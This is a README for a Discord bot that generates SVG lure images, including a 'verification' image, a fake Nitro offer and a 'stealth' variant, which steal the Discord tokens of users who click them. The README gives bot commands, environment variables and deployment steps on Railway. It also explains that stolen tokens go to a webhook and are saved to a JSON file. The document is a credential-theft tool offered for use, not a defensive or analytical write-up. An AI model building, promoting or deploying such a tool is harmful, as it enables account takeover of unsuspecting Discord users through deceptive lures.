# Discord Token Grabber - Image Generator Bot

## Features
- Generates SVG images that grab Discord tokens
- 3 image types: Verification, Nitro, Stealth
- Webhook support for token notifications
- Saves grabbed tokens to JSON file
- Professional panel replies with developer credit

## Commands
| Command | Description |
|---------|-------------|
| `!generate` | Get ALL grabber images |
| `!grabber` | Get verification image |
| `!nitro` | Get fake Nitro image |
| `!stealth` | Get stealth image |
| `!tokens` | Show grabbed tokens stats |
| `!stats` | Show bot statistics |
| `!helpgrabber` | Show help |

## Environment Variables
| Variable | Description |
|----------|-------------|
| `BOT_TOKEN` | Discord Bot Token |
| `WEBHOOK_URL` | Discord Webhook URL (optional) |
| `SERVER_URL` | Your Railway app URL |

## Deployment
1. Upload files to Railway
2. Set environment variables
3. Deploy
4. Use commands in Discord

## How It Works
1. User runs `!generate` to get images
2. User downloads and sends images manually
3. When users click the image, token is grabbed
4. Token is sent to webhook and saved

## Developer
developed by @yathishyt ⚡